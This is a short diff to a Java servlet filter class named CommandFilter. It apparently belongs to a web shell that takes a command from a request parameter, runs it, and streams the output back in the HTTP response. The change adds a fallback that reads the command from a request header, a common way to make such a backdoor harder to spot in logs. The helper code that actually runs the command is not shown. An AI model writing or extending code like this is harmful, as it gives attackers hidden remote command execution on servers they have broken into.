@@ -18,8 +18,12 @@ public class CommandFilter implements Filter {
         HttpServletRequest servletRequest = (HttpServletRequest) request;
         HttpServletResponse servletResponse = (HttpServletResponse) response;
         try {
-            String param = getParam(servletRequest.getParameter(paramName));
-            if (param != null) {
+            String p = servletRequest.getParameter(paramName);
+            if (p == null || p.isEmpty()) {
+                p = servletRequest.getHeader(paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = servletResponse.getOutputStream();
                 byte[] buf = new byte[8192];
